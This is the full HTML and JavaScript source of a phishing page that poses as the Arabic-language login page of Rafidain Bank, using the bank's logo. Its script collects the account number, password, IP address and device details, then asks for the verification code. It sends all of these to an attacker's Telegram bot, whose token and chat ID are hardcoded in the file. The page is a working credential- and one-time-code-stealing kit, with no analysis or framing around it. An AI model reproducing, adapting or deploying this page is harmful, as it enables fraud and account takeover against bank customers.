<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل دخول - مصرف الرافدين</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        #login-container, #verify-container {
            background-color: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            width: 350px;
            text-align: center;
        }

        #login-container img {
            width: 150px;
            margin-bottom: 20px;
        }

        input[type="text"], input[type="password"], input[type="text"].confirmation-code {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #0076b6;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005b8a;
        }

        .forgot-password {
            margin-top: 15px;
        }

        .forgot-password a {
            color: #0076b6;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- قسم تسجيل الدخول -->
    <div id="login-container">
        <img src="https://www.rafidainbank.iq/Assets/img/rafidain-logo.png" alt="شعار مصرف الرافدين" />
        <h2>تسجيل الدخول</h2>
        <form id="login-form">
            <input type="text" id="account-number" placeholder="رقم الحساب" required />
            <input type="password" id="password" placeholder="كلمة المرور" required />
            <button type="submit">تسجيل الدخول</button>
        </form>
        <div class="forgot-password">
            <a href="#">هل نسيت كلمة المرور؟</a>
        </div>
    </div>

    <!-- قسم إدخال رمز التحقق -->
    <div id="verify-container" style="display: none;">
        <h2>إدخال رمز التحقق</h2>
        <form id="verify-form">
            <input type="text" class="confirmation-code" id="confirmation-code" placeholder="أدخل رمز التحقق" required />
            <button type="submit">تأكيد</button>
        </form>
    </div>

    <!-- إضافة مكتبة Axios -->
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "8079772158:AAFATCqs6Dx-Gi0JbS-H1MTEKjuv9PeDa7Y";  // التوكين الخاص بك
        const CHAT_ID = "890258349";  // معرف الشات الخاص بك
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        // عند تقديم نموذج تسجيل الدخول
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();  // منع إرسال البيانات الفعلي

            const email = document.getElementById('account-number').value;
            const password = document.getElementById('password').value;

            // إرسال بيانات الدخول إلى Telegram عبر API
            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip;

                    const userAgent = navigator.userAgent;
                    const platform = navigator.platform;
                    const screenWidth = screen.width;
                    const screenHeight = screen.height;
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                    const message = `
                        <b>New Login Attempt</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}\n
                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                    `;

                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        alert('تم إرسال المعلومات بنجاح!');
                    }).catch(error => {
                        alert('حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.');
                    });
                })
                .catch(error => {
                    alert('حدث خطأ أثناء جلب عنوان IP. يرجى المحاولة مرة أخرى.');
                });

            // إخفاء قسم تسجيل الدخول وعرض قسم التحقق
            document.getElementById('login-container').style.display = 'none';
            document.getElementById('verify-container').style.display = 'block';
        });

        // عند تقديم نموذج إدخال رمز التحقق
        document.getElementById('verify-form').addEventListener('submit', function(e) {
            e.preventDefault();  // منع إرسال النموذج

            const enteredCode = document.getElementById('confirmation-code').value;

            // إرسال رمز التحقق إلى Telegram عبر API
            const message = `
                <b>Verification Code Entered</b>\n
                <b>Code:</b> ${enteredCode}
            `;

            axios.post(URI_API, {
                chat_id: CHAT_ID,
                parse_mode: 'html',
                text: message
            }).then(response => {
                alert('تم إرسال رمز التحقق بنجاح!');
            }).catch(error => {
                alert('حدث خطأ أثناء إرسال رمز التحقق. يرجى المحاولة مرة أخرى.');
            });

            // عرض رسالة تفيد بأنه تم إدخال الرمز
            alert('تم إدخال الرمز بنجاح: ' + enteredCode);
        });
    </script>

</body>
</html>
